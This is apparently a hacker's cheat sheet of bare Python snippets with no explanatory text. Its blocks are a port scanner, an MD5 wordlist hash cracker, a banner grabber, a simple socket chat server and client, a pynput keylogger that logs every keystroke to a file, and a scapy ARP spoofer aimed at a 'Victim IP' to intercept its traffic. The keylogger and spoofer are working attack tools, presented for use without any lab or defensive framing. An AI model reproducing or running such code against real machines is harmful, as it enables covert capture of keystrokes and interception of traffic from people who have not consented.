## Python Snippets for Hackers/Pentesters/Sysadmins

### [ Port Scanner ]

```python
import socket

target = "example.com"  # Replace with the target
ports = range(1, 1025)

print(f"[*] Scanning {target} for open ports...")
for port in ports:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                print(f"[+] Port {port} is open")
    except KeyboardInterrupt:
        print("Scan stopped.")
        break
```

### [ Basic Keylogger ]
```python
from pynput import keyboard

def on_press(key):
    with open("keys.log", "a") as file:
        file.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```


### [ Hash Cracker ]
```python
import hashlib

hash_to_crack = "5d41402abc4b2a76b9719d911017c592"
wordlist = ["test", "password", "hello", "world"]

for word in wordlist:
    if hashlib.md5(word.encode()).hexdigest() == hash_to_crack:
        print(f"[+] Found: {word}")
        break
else:
    print("[-] No match found.")
```

### [ Banner Grabber ]
```python
import socket

target = "example.com"
port = 80

with socket.socket() as s:
    s.connect((target, port))
    s.send(b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n")
    banner = s.recv(1024)
    print(banner.decode())
```

### [ Simple ARP Spoofer ]
```python
from scapy.all import *

target_ip = "192.168.1.10"  # Victim IP
gateway_ip = "192.168.1.1"  # Gateway IP
mac = getmacbyip(target_ip)

packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=mac)
while True:
    send(packet)
```

### [ Socket Server ]
```python
import socket

# Server Configuration
HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 1337      # Choose a port

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"[*] Server listening on {HOST}:{PORT}...")

conn, addr = server_socket.accept()
print(f"[+] Connection established from {addr}")

while True:
    data = conn.recv(1024)
    if not data:
        break
    print(f"[*] Received: {data.decode()}")
    response = input("Enter response: ")
    conn.send(response.encode())

conn.close()
server_socket.close()
```

### [ Socket Client ]
```python
import socket

# Server Configuration
HOST = '127.0.0.1'  # Change to server's IP address if remote
PORT = 1337

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))
print(f"[*] Connected to server {HOST}:{PORT}")

while True:
    message = input("Enter message (or 'exit' to quit): ")
    if message.lower() == 'exit':
        break
    client_socket.send(message.encode())
    response = client_socket.recv(1024).decode()
    print(f"[+] Server response: {response}")

client_socket.close()
```